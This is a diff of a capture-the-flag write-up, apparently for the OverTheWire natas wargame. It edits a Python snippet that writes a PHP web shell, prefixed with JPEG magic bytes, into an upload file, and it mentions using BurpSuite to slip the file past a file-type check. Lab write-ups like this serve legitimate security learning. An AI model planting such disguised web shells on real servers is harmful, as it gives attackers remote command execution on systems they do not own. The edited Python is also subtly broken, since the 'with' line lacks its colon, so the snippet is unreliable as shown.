@@ -269,7 +269,8 @@ We'll use this python line of code to add what we need:
 ```python
 #!/usr/bin/env python
 
-fh.write('\xFF\xD8\xFF\xE0' + '<? passthru($_GET["cmd"]); ?>')
+with open('natas12.php', 'wb') as fh
+    fh.write('\xFF\xD8\xFF\xE0' + '<?php passthru($_GET["cmd"]); ?>')
 ```
 Now we upload the file and intercept the request with BurpSuite like the
 previous level, and remove the strange character at the beginning of the file
